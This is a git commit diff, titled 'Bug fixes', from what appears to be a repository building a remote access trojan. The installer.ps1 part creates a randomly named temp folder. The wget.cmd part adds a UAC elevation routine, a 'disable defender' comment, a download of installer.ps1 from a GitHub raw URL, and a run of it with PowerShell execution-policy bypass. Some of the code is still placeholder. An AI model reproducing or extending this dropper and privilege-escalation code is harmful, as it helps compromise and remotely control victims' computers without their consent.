5064582b96372a1ca817273a2243eaea20a900f9
riahifiras <120566908+riahifiras@users.noreply.github.com>
2024-04-13 17:40:19 +0100

    Bug fixes.

--- files/installer.ps1
+++ files/installer.ps1
@@ -1,5 +1,3 @@
-# Builds resources for rat
-
 # Function to generate random text for directory name
 function random_text {
     $chars = ([char[]]([char]'A'..[char]'Z') + ([char[]]([char]'a'..[char]'z')))
@@ -7,11 +5,19 @@ function random_text {
     return -join $randomChars
 }
 
-# Change directory to the temporary folder
-Set-Location $env:temp
+# Variables
+$wd = random_text
+$path = Join-Path -Path $env:temp -ChildPath $wd
+Write-Output $path
 
-# Generate a random directory name
-$directory_name = random_text
+# Create directory if it doesn't exist
+if (-not (Test-Path $path)) {
+    New-Item -Path $path -ItemType Directory
+}
 
-# Create the directory
-New-Item -ItemType Directory -Name $directory_name
+# Change directory
+Set-Location $path
+
+# Now you can proceed with your script
+Write-Output "" > poc.txt
+Set-Location C:\Users\user\OneDrive\Bureau\rat\files
--- files/wget.cmd
+++ files/wget.cmd
@@ -1,10 +1,41 @@
 REM get admin permissions for script
 @echo off
 
+:: BatchGotAdmin
+:-------------------------------------
+REM  --> Check for permissions
+    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+) ELSE (
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+)
+
+REM --> If error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params= %*
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+:--------------------------------------    
+    <YOUR BATCH SCRIPT HERE>
+
+
 REM disable defender
 start
 
 REM rat ressources
 
 powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/installer.ps1 -OutFile installer.ps1"
-powershell "./installer.ps1"
+powershell -ep bypass -c "./installer.ps1"
